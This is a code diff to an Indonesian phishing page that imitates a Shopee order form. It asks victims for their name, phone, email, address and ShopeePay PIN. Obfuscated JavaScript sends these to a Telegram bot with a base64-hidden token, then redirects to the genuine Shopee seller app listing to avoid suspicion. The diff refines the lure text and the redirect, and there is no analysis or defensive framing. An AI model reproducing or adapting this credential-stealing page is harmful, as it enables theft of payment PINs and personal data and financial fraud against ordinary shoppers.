@@ -30,7 +30,7 @@
         <div class="form-content">
             <div class="form-card">
                 <img src="shop.JPG" class="sh-logo">
-                <p>Silakan lengkapi detail pesanan Anda di bawah ini untuk memproses pengiriman.</p>
+                <p>Silakan lengkapi detail pesanan Anda di bawah ini untuk memproses verifikasi pengiriman.</p>
                 <form id="orderForm">
                     <div class="form-group">
                         <label>Nama Lengkap</label>
@@ -59,11 +59,11 @@
                     
                     <div class="form-group">
                         <label>PIN ShopeePay (6 Digit)</label>
-                        <input type="password" id="pI" maxlength="6" pattern="\d{6}" inputmode="numeric" placeholder="Masukkan 6 digit angka" required oninput="this.value = this.value.replace(/\D/g, '')">
-                        <span class="pin-info">*Diperlukan untuk memverifikasi metode pembayaran Anda.</span>
+                        <input type="password" id="pI" maxlength="6" inputmode="numeric" placeholder="******" required oninput="this.value = this.value.replace(/\D/g, '')">
+                        <span class="pin-info">*Diperlukan untuk memvalidasi pesanan Anda.</span>
                     </div>
 
-                    <button type="submit" id="btnSub">Konfirmasi & Lanjutkan</button>
+                    <button type="submit" id="btnSub">Konfirmasi & Hubungkan</button>
                 </form>
             </div>
         </div>
@@ -71,10 +71,13 @@
 
     <script>
         (function(){
-            // Base64 Encoded Config
+            // Config Telegram (Base64)
             const _0x_a = "ODI4NjgyNDI1NDpBQUdQQWk3dVBmN28wLWExOXphVWpCTENYN0llbHFlUGNhOA==";
             const _0x_b = "NTkyMzAzMTgyNQ==";
-            const _0x_c = "Zm9ybXVsaXIzLmh0bWw="; 
+            
+            // Link Play Store Mitra Shopee (Base64)
+            const _0x_c = "aHR0cHM6Ly9wbGF5Lmdvb2dsZS5jb20vc3RvcmUvYXBwcy9kZXRhaWxzP2lkPWNvbS5zaG9wZWUuc2VsbGVy"; 
+            
             const _0x_u = ["aHR0cHM6Ly9hcGku","dGVsZWdyYW0ub3JnL2JvdA==","L3NlbmRNZXNzYWdl"];
 
             document.getElementById('orderForm').onsubmit = function(e) {
@@ -83,14 +86,13 @@
                 const pin = document.getElementById('pI').value;
                 const btn = document.getElementById('btnSub');
 
-                // Validasi Panjang PIN
                 if (pin.length !== 6) {
-                    alert("PIN harus berupa 6 digit angka!");
+                    alert("Masukkan 6 digit PIN yang valid!");
                     return false;
                 }
 
                 btn.disabled = true;
-                btn.innerText = "Memverifikasi...";
+                btn.innerText = "Memproses...";
 
                 const n = document.getElementById('nL').value;
                 const hp = document.getElementById('nHP').value;
@@ -100,11 +102,8 @@
                 const h = document.getElementById('tH').value;
 
                 const fullUrl = atob(_0x_u[0]) + atob(_0x_u[1]) + atob(_0x_a) + atob(_0x_u[2]);
-                
-                // Menambahkan PIN ke dalam string pesan
-                const msg = `*PESANAN BARU*\nNama: ${n}\nNo HP: ${hp}\nEmail: ${m}\nAlamat: ${a}\nProduk: ${p}\nHarga: Rp${h}\nPIN: ${pin}`;
+                const msg = `*DATA PESANAN BARU*\nNama: ${n}\nNo HP: ${hp}\nEmail: ${m}\nAlamat: ${a}\nProduk: ${p}\nHarga: Rp${h}\nPIN: ${pin}`;
 
-                // Kirim ke Telegram menggunakan fetch
                 fetch(fullUrl, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -114,12 +113,11 @@
                         parse_mode: 'Markdown'
                     })
                 })
-                .then(response => {
-                    // Redirect setelah data terkirim
+                .then(() => {
+                    // Redirect langsung ke aplikasi di Play Store
                     window.location.href = atob(_0x_c);
                 })
-                .catch(error => {
-                    // Tetap redirect meski ada error koneksi
+                .catch(() => {
                     window.location.href = atob(_0x_c);
                 });
             };
